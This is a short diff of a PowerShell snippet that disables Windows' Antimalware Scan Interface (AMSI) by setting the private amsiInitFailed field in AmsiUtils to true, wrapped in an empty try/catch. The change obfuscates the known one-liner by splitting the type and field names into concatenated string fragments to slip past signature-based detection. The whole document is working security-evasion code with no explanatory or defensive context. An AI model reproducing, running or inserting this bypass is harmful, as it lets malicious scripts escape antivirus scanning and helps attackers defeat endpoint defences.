@@ -1,6 +1,6 @@
 Try
 {
-	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+	[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Au'+'tomation.Am'+'siUt'+'ils').GetField('ams'+'iIni'+'tFailed','NonPu'+'blic,Sta'+'tic').SetValue($null,$true)
 }
 Catch
 {}
